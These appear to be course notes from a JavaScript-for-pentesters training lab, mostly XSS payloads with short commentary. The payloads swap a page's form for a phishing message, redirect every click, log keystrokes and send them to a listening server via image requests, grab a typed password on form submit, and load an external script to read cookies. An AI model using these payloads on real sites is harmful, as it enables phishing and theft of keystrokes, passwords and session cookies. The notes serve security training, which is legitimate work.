                    Javascript For Pentesters
                    Course Notes Part 2


5 Social Engineering
Using JS for Social Engineering Attack
Task is to replace existing form and add a please visit message
Again view the page source code
Solution Syntax
  <script>
    var input = document.createElement("h2");
    
    input.innerHTML = "Unfortunately the site is down please visit url;
    
    // In JS to remove a tag you find the parent of the tag and use it to remove the child tag
    
    // This adds the new input element
    document.forms[0].parentNode.appendChild(input);
    
    // This removes the form
    document.forms[0].parentNode.removeChild(document.forms[0]);
    
  </script>
Again the script is ran through a URL encoder and added as a parameter to url option in the address bar


6 Capture All Clicks
Capturing when a user clicks on a webpage and then redirect to a url
Solution Syntax
  <script>
    function CaughtClick(){
      // For testing
      alert("You Clicked");
      
      // add redirect url which will automaticall redirect when you click on the page
      location.href = "redirect url";
    }
    
    // To have the click handler called for every click anywhere on the page
    // will need and event listener called at the document body level
    document.body.addEventListener("Click", CaughtClick, true);
    
  </script>
Again the script is ran through a URL encoder and added as a parameter to url option in the address bar


7 - Keystroke Logging
The task is to log keystrokes live and post to an attack server
Solution Syntax
  <script>
    // Some browser do not support all keys so tracking using keyPress for tracking may not be the best method
    // Most recommend using keyUp but for consistency keyPress is used
    document.onkeypress = function KeyLogger(inp){
      key_pressed = String.fromCharCode(inp.which);
      
      // To send to example server
      new Image().src = "http://localhost:9000/?"+key_pressed;
    }
  </script>

Again the script is ran through a URL encoder and added as a parameter to url option in the address bar
Like previously a server for testing purpose can be ran in many ways, the python way is
  - python -m SimpleHTTPServer 9000  -- This will start a server on port 9000
  - You will see the keystrokes as part of a series of 200 & 301 HTTP Responses
  - Author recommends using the Symantec connect blogs for reading
    - https://www.symantec.com/connect/blogs


8 - Event Listener
Using event listener xss the task is to send the user password back to the user in an alert box when they click the sign in button.
Solution Syntax
  <script>
    // You could solve wthis with a simple mouseover to trigger the xss this can be done by adding
    // "onmouseover="alert(); to the url parameter
    // In this example though it will be a button click
    document.forms[0].onsubmit = function demo(){
      var pass = document.forms[0].elements[1].value;
      
      alert(pass);
    }
  </script>
Again it is best practice to urlencode to get the proper formatting


9 - Include External JS
The task is to include an external JS file into a page to pop a cookie into an alert box
You may need this when the field available to hold data is smaller than you need
Solution Syntax
  <script src="script name"> </script>
  
  // The script file which will need to be hosted for the url needed for the src file above
  // This allows for a large amount of functionality to be added to an attack 
  <script>
    window.addEventListener("load", function(){
      alert(document.cookie);
    });
  </script>

